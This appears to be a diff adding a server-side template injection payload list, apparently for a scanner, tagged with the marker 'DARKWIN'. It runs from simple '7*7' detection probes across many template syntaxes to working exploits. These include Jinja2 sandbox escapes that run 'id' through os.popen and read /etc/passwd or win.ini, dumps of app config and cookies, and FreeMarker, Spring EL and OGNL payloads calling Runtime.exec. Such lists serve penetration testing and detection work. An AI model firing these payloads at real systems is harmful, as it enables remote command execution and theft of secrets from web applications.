@@ -1,0 +1,101 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+[[7*7]]
+#{7*7}
+{7*7}
+{{ 7 * 7 }}
+${ 7 * 7 }
+<%= 7 * 7 %>
+[[ 7 * 7 ]]
+#{ 7 * 7 }
+{ 7 * 7 }
+{{7*'7'}}
+${7*'7'}
+<%= 7*'7' %>
+[[7*'7']]
+#{7*'7'}
+{7*'7'}
+{{config}}
+{{settings}}
+{{self}}
+{{__class__}}
+{{__mro__}}
+{{__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{[].__class__.__base__.__subclasses__()}}
+{{''.__class__.__base__.__subclasses__()}}
+{{().__class__.__base__.__subclasses__()}}
+{{request.application.__self__._modules.conf.settings}}
+{{request['session']}}
+{{request.environ}}
+{{request.form}}
+{{request.args}}
+{{request.values}}
+{{request.cookies}}
+{{request.headers}}
+{{handler.settings}}
+{{config.items()}}
+{{settings.items()}}
+{{self.__dict__}}
+{{self.template.globals}}
+{{get_flashed_messages.__globals__['current_app'].config}}
+{{url_for.__globals__['current_app'].config}}
+{{url_for.__globals__['os'].popen('id').read()}}
+{{url_for.__globals__['os'].system('id')}}
+{{''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[407].__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[40]}}
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[40]('C:\\windows\\win.ini').read()}}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+${"freemarker.template.utility.Execute"?new()("id")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+${"freemarker.template.utility.JspTaglibs"?new()}
+${"java.lang.Runtime".getRuntime().exec("id")}
+${"java.lang.System".getProperty("user.name")}
+${T(java.lang.Runtime).getRuntime().exec("id")}
+${T(java.lang.System).getProperty("user.name")}
+${#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('DARKWIN','VULNERABLE')}
+${#_memberAccess["allowStaticMethodAccess"]=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#rt=@java.lang.Runtime@getRuntime(),#rt.exec("id")}
+${(new java.lang.ProcessBuilder("id")).start()}
+@java.lang.Runtime@getRuntime().exec('id')
+[#assign ex="freemarker.template.utility.Execute"?new()] ${ex("id")}
+[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
+[[${T(java.lang.System).getProperty('user.dir')}]]
+<%- 7*7 %>
+<% 7*7 %>
+<%= 7*7 %>
+<%- "DARKWIN" %>
+<% "DARKWIN" %>
+<%= "DARKWIN" %>
+#{7*7}
+*7*7*
+_7*7_
+~7*7~
+^7*7^
+@7*7@
+%7*7%
+&7*7&
+$7*7$
+!7*7!
+?7*7?
+:7*7:
+;7*7;
+.7*7.
+,7*7,
+/7*7/
+\7*7\
+|7*7|
++7*7+
+-7*7-
+=7*7=
+(7*7)
+[7*7]
+{7*7}
+<7*7>
+"7*7"
+'7*7'
+`7*7`
